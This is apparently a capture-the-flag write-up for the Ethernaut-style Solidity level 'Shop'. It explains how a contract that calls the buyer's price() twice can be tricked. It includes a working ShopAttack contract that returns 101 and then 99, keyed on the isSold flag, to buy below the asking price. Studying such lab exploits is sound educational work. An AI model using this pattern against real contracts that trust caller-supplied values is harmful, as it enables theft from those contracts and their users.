# Shop

Сan you get the item from the shop for less than the price asked?
Things that might help:
* `Shop` expects to be used from a Buyer
* Understanding how `gas()` options works

```javascript
pragma solidity 0.4.24;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}
```

This instance assume that player should deploy a `buyer` contract which has `price()` function that can be call by instance's `buy()`.

From level description, we know that we should money less than `100` to buy something, however, `_buyer.price.gas(3000)() >= price` restrict it our first feedback should bigger than `100` and `_buyer.price.gas(3000)()` restrict our second feedback call by `price = _buyer.price.gas(3000)();` cannot change any `storage` variable.

So, we need something else which will change between first call `price()` and the second one to trigger the change of return value.

`isSold` might be the perfect solution which is `storage variable` change by `Buy()` itself which out of restriction of `_buyer.price.gas(3000)()` but still can be use as a flag.

```javascript
pragma solidity 0.4.24;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price.gas(3000)() >= price && !isSold) {
      isSold = true;
      price = _buyer.price.gas(3000)();
    }
  }
}

contract ShopAttack {

  function price() external view returns (uint) {
    return Shop(msg.sender).isSold() ? 99 : 101;
  }

  function attack(Shop _victim) external {
    Shop(_victim).buy();
  }
}
```

Deploy the `ShopAttack` contract and call `buy()` of instance.

```javascript
await contract.price()
//Trigger Attack
await contract.price()
```

Check if price be set under than `100`.